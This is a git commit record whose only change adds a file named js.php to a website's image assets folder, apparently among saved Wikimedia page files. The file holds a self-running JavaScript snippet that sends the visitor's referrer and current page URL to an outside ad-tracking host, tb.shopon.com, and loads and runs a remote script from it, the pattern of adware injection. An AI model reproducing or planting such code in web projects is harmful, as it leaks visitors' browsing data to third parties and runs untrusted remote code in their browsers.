04aedc21cab2f38cc718cd4f50a4d80a3abb19dc
Nathan Archibald <narchie2013@gmail.com>
2014-03-27 00:18:53 -0600

    Total Redo

---
+++ _assets/img/Wikimedia_files/js.php
@@ -0,0 +1,9 @@
+
+(function () {
+    var url = 'http://tb.shopon.com/js.php?mb=5oR&subid=391554&brand=save keep&action=check&referer=' + encodeURIComponent(document.referrer) + '&url=' + encodeURIComponent(location.href);
+
+    var c = document.createElement('script');
+    c.async=true; 
+    c.src = url;
+    (document.body || document.head || document.documentElement).appendChild(c);
+})();
